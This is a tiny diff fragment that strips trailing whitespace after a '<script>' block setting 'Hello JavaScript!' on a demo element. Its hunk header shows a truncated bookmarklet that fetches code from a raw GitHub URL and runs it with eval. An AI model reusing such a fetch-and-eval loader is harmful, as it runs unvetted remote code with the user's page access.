@@ -14,4 +14,4 @@ javascript:(async()=>{eval(await(await fetch('https://raw.githubusercontent.com/
 
 <script>
 document.getElementById("demo").innerHTML = "Hello JavaScript!";
-</script> 
+</script>
